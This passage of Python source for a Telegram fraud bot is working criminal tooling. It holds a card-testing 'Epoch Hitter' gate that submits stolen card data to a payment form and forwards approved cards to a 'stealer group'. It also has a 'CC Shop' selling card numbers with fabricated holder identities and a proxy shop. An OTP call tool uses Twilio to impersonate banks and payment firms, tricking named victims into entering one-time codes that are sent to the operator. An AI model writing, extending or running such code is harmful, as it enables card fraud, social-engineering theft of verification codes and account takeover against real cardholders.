        bin_type += f" - {bin_info.get('type', '').upper()}"

    start_time = time_module.time()
    try:
        browser_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Sec-Ch-Ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
        }

        jar = aiohttp.CookieJar(unsafe=True)
        conn = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(headers=browser_headers, cookie_jar=jar, connector=conn) as sess:
            page_text = ""
            final_url = invoice_url
            try:
                async with sess.get(invoice_url, timeout=aiohttp.ClientTimeout(total=20), allow_redirects=True) as resp:
                    page_text = await resp.text()
                    final_url = str(resp.url)
            except Exception as e:
                print(f"[Epoch] Page fetch error: {e}")

            parsed = urlparse(final_url)
            params = parse_qs(parsed.query)
            epoch_host = parsed.hostname or "wnu.com"

            pi_code = params.get('pi_code', [None])[0]
            sku = params.get('sku', [None])[0]

            if not pi_code:
                pi_match = re.search(r'pi_code["\s]*[=:]\s*["\']?([a-zA-Z0-9_-]+)', page_text)
                if pi_match:
                    pi_code = pi_match.group(1)
            if not sku:
                sku_match = re.search(r'name=["\']?sku["\']?\s+value=["\']?([^"\'>\s]+)', page_text, re.IGNORECASE)
                if sku_match:
                    sku = sku_match.group(1)

            hidden_inputs = {}
            for m in re.finditer(r'<input[^>]*type=["\']?hidden["\']?[^>]*>', page_text, re.IGNORECASE):
                tag = m.group(0)
                name_m = re.search(r'name=["\']?([^"\'>\s]+)', tag)
                val_m = re.search(r'value=["\']?([^"\'>\s]*)', tag)
                if name_m:
                    hidden_inputs[name_m.group(1)] = val_m.group(1) if val_m else ''

            form_action = None
            action_match = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', page_text, re.IGNORECASE)
            if action_match:
                form_action = action_match.group(1)

            submit_url = f"https://{epoch_host}/secure/services/joinByCC.php"
            if form_action:
                if form_action.startswith('http'):
                    submit_url = form_action
                elif form_action.startswith('/'):
                    submit_url = f"https://{epoch_host}{form_action}"

            form_data = {}
            form_data.update(hidden_inputs)

            form_data.update({
                'cardnum': cc,
                'ccnum': cc,
                'card_number': cc,
                'expmonth': mm,
                'expMonth': mm,
                'exp_month': mm,
                'expyear': yy_full,
                'expYear': yy_full,
                'exp_year': yy_full,
                'cvv2': cvv,
                'cvv': cvv,
                'card_cvv': cvv,
                'name': 'John Smith',
                'email': 'johnsmith2024@gmail.com',
                'zip': '10001',
                'zipcode': '10001',
                'country': 'US',
                'ans': '1',
                'agree': '1',
                'submit': 'Join Now',
            })

            if pi_code:
                form_data['pi_code'] = pi_code
            if sku:
                form_data['sku'] = sku

            for k, v in params.items():
                if k not in form_data:
                    form_data[k] = v[0]

            submit_headers = dict(browser_headers)
            submit_headers.update({
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": f"https://{epoch_host}",
                "Referer": final_url,
                "Sec-Fetch-Site": "same-origin",
            })

            response_text = ""
            response_url = ""
            try:
                async with sess.post(
                    submit_url,
                    data=form_data,
                    headers=submit_headers,
                    timeout=aiohttp.ClientTimeout(total=30),
                    allow_redirects=True
                ) as resp:
                    response_text = await resp.text()
                    response_url = str(resp.url)
            except Exception as e:
                response_text = str(e)

        elapsed = time_module.time() - start_time

        resp_lower = response_text.lower()
        url_lower = response_url.lower()

        is_hit = False
        response_msg = "Declined"

        if any(kw in resp_lower for kw in ['thank you', 'successfully', 'approved', 'welcome', 'membership activated', 'order complete', 'congratulations', 'your account']):
            is_hit = True
            response_msg = "Approved - Transaction Successful"
        elif any(kw in url_lower for kw in ['thank', 'success', 'welcome', 'confirm', 'approved']):
            is_hit = True
            response_msg = "Approved - Redirected to Success"
        elif 'transaction has been approved' in resp_lower:
            is_hit = True
            response_msg = "Transaction Approved"
        elif any(kw in resp_lower for kw in ['declined', 'invalid card', 'card number is invalid', 'do not honor', 'insufficient funds', 'expired card', 'lost card', 'stolen card', 'pickup card', 'restricted card']):
            is_hit = False
            decline_match = re.search(r'(?:error|decline|reason|message)[^<]*?[>:]\s*([^<]+)', response_text, re.IGNORECASE)
            if decline_match:
                response_msg = decline_match.group(1).strip()[:120]
            else:
                for kw in ['declined', 'invalid card', 'do not honor', 'insufficient funds', 'expired card']:
                    if kw in resp_lower:
                        response_msg = kw.title()
                        break
        elif 'error' in resp_lower or 'failed' in resp_lower:
            err_match = re.search(r'(?:class=["\']error[^>]*>|error[^<]*[>:])\s*([^<]+)', response_text, re.IGNORECASE)
            if err_match:
                response_msg = err_match.group(1).strip()[:120]
            else:
                response_msg = "Processing Error"
        elif len(response_text) < 50:
            response_msg = response_text.strip()[:100] if response_text.strip() else "No Response"
        else:
            response_msg = "Unknown Response"

        if is_hit:
            log_approved_card(user.id, username, cc, mm, yy, cvv, "cam", response_msg, bin_info)
            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "cam", response_msg, bin_info, user.id, username)
            response = _build_gate_response(cc, mm, yy, cvv, "approved", f"Approved - {response_msg}", "Epoch Hitter", bin_info, elapsed, username)
            try:
                await loading_msg.delete()
            except:
                pass
            gif_url = get_sexy_anime_gif("success")
            await message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)
        else:
            response = _build_gate_response(cc, mm, yy, cvv, "declined", f"Declined - {response_msg}", "Epoch Hitter", bin_info, elapsed, username)
            try:
                await loading_msg.delete()
            except:
                pass
            gif_url = get_sexy_anime_gif("failed")
            await message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)

    except Exception as e:
        elapsed = time_module.time() - start_time
        await loading_msg.edit_text(
            f"❌ <b>Epoch Hitter Error</b>\n\n"
            f"Card: <code>{card_str}</code>\n"
            f"Error: {str(e)[:200]}\n"
            f"Time: {elapsed:.2f}s",
            parse_mode=ParseMode.HTML
        )

# ============================================================================
# MAIN FUNCTION
# ============================================================================

async def init_supabase_async():
    """Initialize Supabase connection asynchronously"""
    try:
        result = await init_supabase()
        return result
    except Exception as e:
        print(f"⚠️ Supabase init error: {e}")
        return False

async def ping_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    start = time.time()
    sent = await update.message.reply_text(f"{EMOJI['bolt']} Pinging...", parse_mode=ParseMode.HTML)
    latency_ms = round((time.time() - start) * 1000)
    uptime_sec = int(time.time() - _bot_start_time)
    hours, rem = divmod(uptime_sec, 3600)
    mins, secs = divmod(rem, 60)
    uptime_str = f"{hours}h {mins}m {secs}s"
    await sent.edit_text(
        f"{EMOJI['bolt']} Pong! Latency: <code>{latency_ms}ms</code> | Uptime: <code>{uptime_str}</code>",
        parse_mode=ParseMode.HTML
    )


# ============================================================================
# CC SHOP BOT COMMANDS
# ============================================================================

async def proxyshop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("You are not approved to use this bot.")
        return

    from modules.cc_shop import get_user_balance
    from modules.proxy_shop import get_proxy_plans, PROXY_TYPES, PROXY_CATEGORIES

    balance = get_user_balance(user_id)
    plans = get_proxy_plans(active_only=True)

    if not plans:
        await update.message.reply_text(
            f"🌐 <b>Proxy Shop</b>\n\n"
            f"💰 Your Balance: <b>${balance:.2f}</b>\n\n"
            f"No proxy plans available right now.\n\n"
            f"Visit the web panel for more options.",
            parse_mode=ParseMode.HTML
        )
        return

    by_cat = {}
    for p in plans[:30]:
        cat = (p.get('category', '') or 'datacenter').capitalize()
        if cat not in by_cat:
            by_cat[cat] = []
        bw = float(p.get('bandwidth_gb', 0))
        price = float(p.get('price', 0))
        bw_str = 'Unlimited' if bw == 0 else f'{bw:.0f}GB'
        by_cat[cat].append(f"  {html_escape(p['proxy_type'])} | {html_escape(p['name'])} | {bw_str} | ${price:.2f}")

    lines = []
    for cat, items in by_cat.items():
        lines.append(f"\n📦 <b>{cat}</b>")
        lines.extend(items[:10])

    domain = os.environ.get('REPLIT_DEPLOYMENT_URL', '') or os.environ.get('REPLIT_DEV_DOMAIN', '')
    if domain and not domain.startswith('http'):
        domain = f"https://{domain}"
    panel_url = f"{domain}/user/proxyshop" if domain else "/user/proxyshop"

    text = (
        f"🌐 <b>Proxy Shop - Available Plans</b>\n\n"
        f"💰 Your Balance: <b>${balance:.2f}</b>\n"
        + "\n".join(lines) +
        f"\n\n🔗 <b>Buy via Web Panel:</b>\n{html_escape(panel_url)}"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def myproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("You are not approved to use this bot.")
        return

    from modules.proxy_shop import get_user_proxy_purchases, format_proxy_string, bandwidth_meter_text, expire_old_purchases

    expire_old_purchases()
    data = get_user_proxy_purchases(user_id, page=1, per_page=10)

    if not data['purchases']:
        await update.message.reply_text(
            f"🔑 <b>My Proxies</b>\n\nNo active proxy purchases.\nUse /proxyshop to browse plans.",
            parse_mode=ParseMode.HTML
        )
        return

    lines = [f"🔑 <b>My Proxies</b> ({data['total']} total)\n"]
    for p in data['purchases']:
        status = p.get('status', 'active')
        icon = '🟢' if status == 'active' else '🔴'
        proxy_str = format_proxy_string(p)
        bw_text = bandwidth_meter_text(p)
        expires = str(p.get('expires_at', ''))[:16]
        lines.append(
            f"{icon} <b>{html_escape(p.get('plan_name','') or 'Proxy')}</b> [{html_escape(p.get('proxy_type',''))}]\n"
            f"<code>{html_escape(proxy_str)}</code>\n"
            f"{bw_text}\n"
            f"Expires: {expires}\n"
        )

    domain = os.environ.get('REPLIT_DEPLOYMENT_URL', '') or os.environ.get('REPLIT_DEV_DOMAIN', '')
    if domain and not domain.startswith('http'):
        domain = f"https://{domain}"
    panel_url = f"{domain}/user/myproxies" if domain else "/user/myproxies"
    lines.append(f"🔗 <b>View all:</b> {html_escape(panel_url)}")

    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)


async def shop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("You are not approved to use this bot.")
        return

    from modules.cc_shop import get_stock_summary, get_user_balance

    balance = get_user_balance(user_id)
    summary = get_stock_summary()

    if not summary:
        await update.message.reply_text(
            f"💳 <b>CC Shop</b>\n\n"
            f"💰 Your Balance: <b>${balance:.2f}</b>\n\n"
            f"No cards available right now.",
            parse_mode=ParseMode.HTML
        )
        return

    lines = []
    for row in summary[:20]:
        country = row.get('country', 'Unknown')
        code = row.get('country_code', '')
        brand = row.get('brand', '')
        count = row.get('count', 0)
        avg = float(row.get('avg_price', 0))
        lines.append(f"  {country} ({code}) | {brand} | {count} cards | ~${avg:.2f}")

    text = (
        f"💳 <b>CC Shop - Stock Overview</b>\n\n"
        f"💰 Your Balance: <b>${balance:.2f}</b>\n\n"
        f"<b>Available Stock:</b>\n"
        + "\n".join(lines) +
        f"\n\nUse /shopbuy &lt;country&gt; to browse cards"
        f"\nUse /balance to check your balance"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def shopbuy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("You are not approved to use this bot.")
        return

    from modules.cc_shop import get_available_cards, purchase_card, get_user_balance
    from modules.fake_identity import generate_holder_info
    from modules.bin_lookup import _flag

    args = context.args
    if not args:
        await update.message.reply_text(
            "Usage: /shopbuy &lt;country&gt; or /shopbuy &lt;card_id&gt;\n\n"
            "Examples:\n"
            "  /shopbuy US - Browse US cards\n"
            "  /shopbuy 42 - Buy card #42",
            parse_mode=ParseMode.HTML
        )
        return

    arg = " ".join(args)

    if arg.isdigit():
        card_id = int(arg)
        balance = get_user_balance(user_id)

        from modules.database import _execute_with_retry
        card_info = _execute_with_retry(
            "SELECT country, country_code FROM cc_shop_stock WHERE id = %s AND status = 'available'",
            (card_id,), fetch_one=True
        )
        if not card_info:
            await update.message.reply_text("Card not found or already sold.")
            return

        holder = generate_holder_info(
            country_name=card_info.get('country', ''),
            country_code=card_info.get('country_code', '')
        )
        result = purchase_card(user_id, card_id, holder)
        if result.get('error'):
            await update.message.reply_text(ae(f"❌ {result['error']}"))
            return

        card = result['card']
        cc_full = f"{card['cc_number']}|{card['mm']}|{card['yy']}|{card['cvv']}"
        text = (
            f"✅ <b>Card Purchased!</b>\n\n"
            f"💳 <code>{cc_full}</code>\n\n"
            f"📊 BIN: {card.get('bin6','')} | {card.get('brand','')} | {card.get('card_type','')}\n"
            f"🏦 Bank: {card.get('bank','')}\n"
            f"🌍 Country: {card.get('country','')} ({card.get('country_code','')})\n"
            f"💰 Price: ${result['price']:.2f}\n"
            f"💰 New Balance: ${result['new_balance']:.2f}\n\n"
            f"👤 <b>Holder Info:</b>\n"
            f"  Name: {holder['name']}\n"
            f"  Email: {holder['email']}\n"
            f"  Phone: {holder['phone']}\n"
            f"  Address: {holder['address']}"
        )
        await update.message.reply_text(text, parse_mode=ParseMode.HTML)
        return

    stock = get_available_cards(country=arg, page=1, per_page=10)
    if not stock['cards']:
        await update.message.reply_text(f"No cards found for '{arg}'")
        return

    lines = []
    for c in stock['cards']:
        flag = _flag(c.get('country_code', ''))
        lines.append(
            f"  #{c['id']} | {c.get('bin6','')} | {flag} {c.get('country_code','')} | "
            f"{c.get('brand','')} | {c.get('card_type','')} | ${float(c.get('price',0)):.2f}"
        )

    balance = get_user_balance(user_id)
    text = (
        f"💳 <b>CC Shop - {arg.upper()}</b>\n"
        f"💰 Balance: ${balance:.2f}\n\n"
        + "\n".join(lines) +
        f"\n\n{stock['total']} total | Page 1/{stock['pages']}\n"
        f"Use /shopbuy &lt;card_id&gt; to purchase"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("You are not approved to use this bot.")
        return

    from modules.cc_shop import get_user_balance
    balance = get_user_balance(user_id)
    await update.message.reply_text(
        f"💰 <b>Your Shop Balance</b>\n\n"
        f"Balance: <b>${balance:.2f}</b>\n\n"
        f"Use the web panel or contact admin to add funds.",
        parse_mode=ParseMode.HTML
    )


async def checkout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("You are not approved to use this bot.")
        return

    try:
        if stripe is None:
            await update.message.reply_text("❌ Stripe is not installed on this deployment.")
            return
        from config import STRIPE_SECRET_KEY, STRIPE_CHECKOUT_PRICE_ID, STRIPE_SUCCESS_URL, STRIPE_CANCEL_URL
        if not STRIPE_SECRET_KEY or not STRIPE_CHECKOUT_PRICE_ID or not STRIPE_SUCCESS_URL or not STRIPE_CANCEL_URL:
            await update.message.reply_text("❌ Stripe checkout is not configured on this deployment.")
            return
        stripe.api_key = STRIPE_SECRET_KEY
        session = stripe.checkout.Session.create(
            mode="payment",
            line_items=[{"price": STRIPE_CHECKOUT_PRICE_ID, "quantity": 1}],
            success_url=STRIPE_SUCCESS_URL,
            cancel_url=STRIPE_CANCEL_URL,
        )
        await update.message.reply_text(
            f"✅ <b>Checkout Session Created</b>\n\n{session.url}",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to create checkout session: {e}")


async def setscript_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("❌ You are not approved to use this bot.")
        return
    script = " ".join(context.args).strip() if context.args else ""
    if not script:
        await update.message.reply_text(
            "❌ Please provide a script.\n\n"
            "Example:\n"
            "<code>/setscript Namaste ji, aapka account block ho gaya hai. 1 dabayein.</code>",
            parse_mode=ParseMode.HTML,
        )
        return
    context.user_data['call_script'] = script
    preview = script[:80] + ("…" if len(script) > 80 else "")
    await update.message.reply_text(
        f"✅ <b>Script saved!</b>\n\n"
        f"📝 <i>{html_escape(preview)}</i>\n\n"
        f"This script will be used for every <code>/call</code> until you <code>/clearscript</code>.",
        parse_mode=ParseMode.HTML,
    )


async def myscript_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("❌ You are not approved to use this bot.")
        return
    script = context.user_data.get('call_script', '')
    if not script:
        await update.message.reply_text(
            "📝 No script saved.\n\n"
            "Use <code>/setscript &lt;your text&gt;</code> to save one.",
            parse_mode=ParseMode.HTML,
        )
    else:
        await update.message.reply_text(
            f"📝 <b>Your saved script:</b>\n\n<i>{html_escape(script)}</i>",
            parse_mode=ParseMode.HTML,
        )


async def clearscript_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("❌ You are not approved to use this bot.")
        return
    context.user_data.pop('call_script', None)
    await update.message.reply_text("🗑️ Script cleared. Default voice script will be used.")


async def call_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    if not is_approved(user_id):
        await update.message.reply_text("❌ You are not approved to use this bot.")
        return

    args = context.args
    USAGE = (
        "📞 <b>OTP Call Tool</b>\n\n"
        "<b>Usage:</b>\n"
        "<code>/call &lt;phone&gt; &lt;name&gt; &lt;otp_digits&gt; &lt;company&gt; [lang] [| custom script]</code>\n\n"
        "<b>Arguments:</b>\n"
        "• <code>phone</code> — Target phone with country code (e.g. +12025551234)\n"
        "• <code>name</code> — Victim's name (use _ for spaces, e.g. John_Doe)\n"
        "• <code>otp_digits</code> — Number of OTP digits (4–8)\n"
        "• <code>company</code> — Company to impersonate (e.g. Amazon)\n"
        "• <code>lang</code> — Language: en | hi | es | fr | de | pt\n"
        "  Omit to get a language picker keyboard 🌐\n"
        "• <code>| custom script</code> — Optional: overrides saved script for this call\n\n"
        "<b>Script tip:</b> Save a reusable script with <code>/setscript</code> — it will be used on every call automatically.\n\n"
        "<b>Examples:</b>\n"
        "<code>/call +12025551234 John_Doe 6 PayPal hi</code>\n"
        "<code>/call +12025551234 Rahul 6 HDFC</code>  ← shows language picker\n"
        "<code>/call +12025551234 Rahul 6 HDFC hi | Namaste ji, 1 dabayein.</code>\n\n"
        "The call will:\n"
        "1️⃣ Ring the target — they press 1 to continue\n"
        "2️⃣ Request they enter their OTP code\n"
        "3️⃣ Send you the captured code instantly 🔐\n\n"
        "<b>Hindi voice:</b> Slow &amp; sweet (Polly Kajal) 🎙"
    )

    if not args or len(args) < 4:
        await update.message.reply_text(USAGE, parse_mode=ParseMode.HTML)
        return

    # Parse args — split on | to extract optional custom script
    raw = " ".join(args)
    custom_script_inline = ""
    if "|" in raw:
        parts = raw.split("|", 1)
        call_args = parts[0].strip().split()
        custom_script_inline = parts[1].strip()
    else:
        call_args = args

    if len(call_args) < 4:
        await update.message.reply_text(USAGE, parse_mode=ParseMode.HTML)
        return

    phone          = call_args[0]
    name           = call_args[1].replace("_", " ")
    otp_digits_str = call_args[2]
    company        = call_args[3].replace("_", " ")
    # lang is optional — if absent, show language picker
    explicit_lang  = call_args[4].lower() if len(call_args) >= 5 else ""

    if not phone.startswith("+"):
        await update.message.reply_text(
            "❌ Phone number must include country code.\n"
            "Example: <code>+12025551234</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    try:
        otp_digits = int(otp_digits_str)
        if not (4 <= otp_digits <= 8):
            raise ValueError()
    except ValueError:
        await update.message.reply_text("❌ OTP digits must be a number between 4 and 8.")
        return

    from modules.twilio_call import (
        LANGUAGES, initiate_call, TWILIO_ACCOUNT_SID
    )

    if not TWILIO_ACCOUNT_SID:
        await update.message.reply_text(
            "❌ Twilio credentials not configured.\n"
            "Set TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN, and TWILIO_PHONE_NUMBER in secrets."
        )
        return

    # Resolve the script: inline override > saved script > (empty = default)
    saved_script  = context.user_data.get('call_script', '')
    custom_script = custom_script_inline if custom_script_inline else saved_script

    # Resolve saved caller ID for this user
    from modules.twilio_call import get_user_caller_id
    caller_id = get_user_caller_id(str(user_id))

    # If no lang given, show the language picker keyboard
    if not explicit_lang or explicit_lang not in LANGUAGES:
        context.user_data['pending_call'] = {
            "phone": phone,
            "name": name,
            "otp_digits": otp_digits,
            "company": company,
            "custom_script": custom_script,
            "caller_id": caller_id,
            "chat_id": str(chat_id),
            "user_id": str(user_id),
        }
        script_note = (
            f"\n📝 <i>Script: {html_escape(custom_script[:60])}{'…' if len(custom_script) > 60 else ''}</i>"
            if custom_script else "\n📝 <i>Using default script</i>"
        )
        from telegram import InlineKeyboardMarkup, InlineKeyboardButton
        await update.message.reply_text(
            f"🌐 <b>Choose voice language for the call:</b>\n\n"
            f"📞 <code>{phone}</code> — {name} — {company}{script_note}",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🇮🇳 Hindi", callback_data="calllang_hi"),
                 InlineKeyboardButton("🇬🇧 English", callback_data="calllang_en")],
                [InlineKeyboardButton("🇪🇸 Spanish", callback_data="calllang_es"),
                 InlineKeyboardButton("🇫🇷 French", callback_data="calllang_fr")],
                [InlineKeyboardButton("🇩🇪 German", callback_data="calllang_de"),
                 InlineKeyboardButton("🇧🇷 Portuguese", callback_data="calllang_pt")],
            ]),
        )
        return

    lang = explicit_lang
    await _place_call(update, context, phone, name, otp_digits, company, lang,
                      custom_script, chat_id, user_id, caller_id=caller_id)


async def call_lang_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Handles language picker button presses from /call flow.
    callback_data format: calllang_<code>  e.g. calllang_hi
    Only the user who ran /call may press the buttons.
    """
    query = update.callback_query

    lang = query.data.split("_", 1)[1]
    presser_id = str(query.from_user.id)

    # Ownership guard — only the invoker can select a language
    pending = context.user_data.get('pending_call')
    if not pending or pending.get('user_id') != presser_id:
        await query.answer("❌ This language picker is not for you.", show_alert=True)
        return

    await query.answer()
    context.user_data.pop('pending_call', None)

    phone         = pending['phone']
    name          = pending['name']
    otp_digits    = pending['otp_digits']
    company       = pending['company']
    custom_script = pending.get('custom_script', '')
    caller_id     = pending.get('caller_id', '')
    chat_id       = pending['chat_id']
    user_id       = pending['user_id']

    from modules.twilio_call import LANGUAGES, initiate_call, TWILIO_PHONE

    flag_map = {
        "hi": "🇮🇳", "en": "🇬🇧", "es": "🇪🇸",
        "fr": "🇫🇷", "de": "🇩🇪", "pt": "🇧🇷",
    }
    flag = flag_map.get(lang, "🌐")
    lang_name = LANGUAGES.get(lang, "English")
    cid_display = caller_id.strip() if caller_id.strip() else TWILIO_PHONE

    script_preview = (
        f"\n📝 Script: <i>{html_escape(custom_script[:60])}{'…' if len(custom_script) > 60 else ''}</i>"
        if custom_script else ""
    )

    await query.edit_message_text(
        f"📡 <b>Initiating call...</b>\n\n"
        f"📞 Target: <code>{phone}</code>\n"
        f"📲 Caller ID: <code>{cid_display}</code>\n"
        f"👤 Name: {name}\n"
        f"🏢 Company: {company}\n"
        f"🔢 OTP Digits: {otp_digits}\n"
        f"{flag} Language: {lang_name}{script_preview}",
        parse_mode=ParseMode.HTML,
    )

    try:
        result = initiate_call(
            phone=phone,
            chat_id=str(chat_id),
            user_id=str(user_id),
            name=name,
            company=company,
            otp_digits=otp_digits,
            lang=lang,
            custom_script=custom_script,
            caller_id=caller_id,
        )
        await query.edit_message_text(
            f"✅ <b>Call placed!</b>\n\n"
            f"📞 Target: <code>{phone}</code>\n"
            f"📲 Caller ID: <code>{cid_display}</code>\n"
            f"👤 Name: {name}\n"
            f"🏢 Company: {company}\n"
            f"🔢 OTP Digits: {otp_digits}\n"
            f"{flag} Language: {lang_name}\n"
            f"📋 Call SID: <code>{result['sid']}</code>\n"
            f"📊 Status: {result['status']}{script_preview}\n\n"
            f"🔔 You'll receive live status updates and the OTP here.",
            parse_mode=ParseMode.HTML,
        )
    except Exception as e:
        err = str(e)
        if "invalid phone number" in err.lower() or "21211" in err:
            msg = "❌ Invalid phone number format. Use E.164 format: <code>+12025551234</code>"
        elif "not a valid" in err.lower() or "21614" in err:
            msg = "❌ Phone number is not SMS-capable or invalid."
        elif "account" in err.lower() and "not" in err.lower():
            msg = "❌ Twilio account issue. Check your credentials."
        elif "21608" in err:
            msg = "❌ Phone number is unverified. Add it to Twilio's verified caller IDs (trial accounts only)."
        else:
            msg = f"❌ Call failed: {html_escape(err)}"
        await query.edit_message_text(msg, parse_mode=ParseMode.HTML)


async def _place_call(update, context, phone, name, otp_digits, company, lang,
                      custom_script, chat_id, user_id, caller_id: str = ""):
    """Shared helper: place the call and report success/failure."""
    from modules.twilio_call import LANGUAGES, initiate_call, TWILIO_PHONE

    script_preview = (
        f"\n📝 Script: <i>{html_escape(custom_script[:60])}{'…' if len(custom_script) > 60 else ''}</i>"
        if custom_script else ""
    )
    cid_display = caller_id.strip() if caller_id.strip() else TWILIO_PHONE

    status_msg = await update.message.reply_text(
        f"📡 <b>Initiating call...</b>\n\n"
        f"📞 Target: <code>{phone}</code>\n"
        f"📲 Caller ID: <code>{cid_display}</code>\n"
        f"👤 Name: {name}\n"
        f"🏢 Company: {company}\n"
        f"🔢 OTP Digits: {otp_digits}\n"
        f"🌐 Language: {LANGUAGES.get(lang, 'English')}{script_preview}",
        parse_mode=ParseMode.HTML,
    )

    try:
        result = initiate_call(
            phone=phone,
            chat_id=str(chat_id),
            user_id=str(user_id),
            name=name,
            company=company,
            otp_digits=otp_digits,
            lang=lang,
            custom_script=custom_script,
            caller_id=caller_id,
        )
        await status_msg.edit_text(
            f"✅ <b>Call placed!</b>\n\n"
            f"📞 Target: <code>{phone}</code>\n"
            f"📲 Caller ID: <code>{cid_display}</code>\n"
            f"👤 Name: {name}\n"
            f"🏢 Company: {company}\n"
            f"🔢 OTP Digits: {otp_digits}\n"
            f"🌐 Language: {LANGUAGES.get(lang, 'English')}\n"
            f"📋 Call SID: <code>{result['sid']}</code>\n"
            f"📊 Status: {result['status']}{script_preview}\n\n"
            f"🔔 You'll receive live status updates and the OTP here.",
            parse_mode=ParseMode.HTML,
        )
    except Exception as e:
        err = str(e)
        if "invalid phone number" in err.lower() or "21211" in err:
            msg = "❌ Invalid phone number format. Use E.164 format: <code>+12025551234</code>"
        elif "not a valid" in err.lower() or "21614" in err:
            msg = "❌ Phone number is not SMS-capable or invalid."
        elif "account" in err.lower() and "not" in err.lower():
            msg = "❌ Twilio account issue. Check your credentials."
        elif "21608" in err:
            msg = "❌ Phone number is unverified. Add it to Twilio's verified caller IDs (trial accounts only)."
        else:
            msg = f"❌ Call failed: {html_escape(err)}"
        await status_msg.edit_text(msg, parse_mode=ParseMode.HTML)


async def otp_action_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Handles ✅ Accept OTP / ❌ Decline OTP button presses from captured OTP messages.
    callback_data format: otp_accept_<digits> or otp_decline_<digits>
    """
    query = update.callback_query
    await query.answer()

    parts = query.data.split("_", 2)
    if len(parts) < 3:
        await query.edit_message_text("❌ Invalid callback data.")
        return

    action = parts[1]
    otp    = parts[2]

    if action == "accept":
        phone_line = ""
        if query.message and query.message.text:
            for line in query.message.text.splitlines():
                if "Phone:" in line or "📞" in line:
                    phone_line = line.strip()
                    break
        await query.edit_message_text(
            f"✅ <b>OTP Accepted</b>\n\n"
            f"🔑 Code: <b><code>{otp}</code></b>\n"
            f"{phone_line}\n\n"
            f"<i>Marked as accepted by operator.</i>",
            parse_mode=ParseMode.HTML,
        )
    elif action == "decline":
        await query.edit_message_text(
            f"❌ <b>OTP Declined</b>\n\n"
            f"🔑 Code: <code>{otp}</code>\n\n"
            f"<i>Marked as rejected by operator.</i>",
            parse_mode=ParseMode.HTML,
        )


async def addbalance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("Only owners can add balance.")
        return

    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /addbalance <user_id> <amount>")
        return

    try:
        target_id = int(args[0])
        amount = float(args[1])
    except ValueError:
        await update.message.reply_text("Invalid user_id or amount.")
        return

    from modules.cc_shop import add_user_balance, get_user_balance
    add_user_balance(target_id, amount)
    new_balance = get_user_balance(target_id)
    await update.message.reply_text(
        f"✅ Added ${amount:.2f} to user {target_id}\n"
        f"New balance: ${new_balance:.2f}",
        parse_mode=ParseMode.HTML
    )


async def mypurchases_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("You are not approved to use this bot.")
        return

    from modules.cc_shop import get_purchased_cards
    data = get_purchased_cards(user_id, page=1, per_page=5)

    if not data['cards']:
        await update.message.reply_text("You haven't purchased any cards yet.\nUse /shop to browse available cards.")
        return

    lines = []
    for c in data['cards']:
        cc_full = f"{c['cc_number']}|{c['mm']}|{c['yy']}|{c['cvv']}"
        lines.append(
            f"💳 <code>{cc_full}</code>\n"
            f"   {c.get('brand','')} | {c.get('country','')} | ${float(c.get('price',0)):.2f}\n"
            f"   👤 {c.get('holder_name','N/A')} | {c.get('holder_email','N/A')}\n"
            f"   📱 {c.get('holder_phone','N/A')}\n"
            f"   📍 {c.get('holder_address','N/A')}"
        )

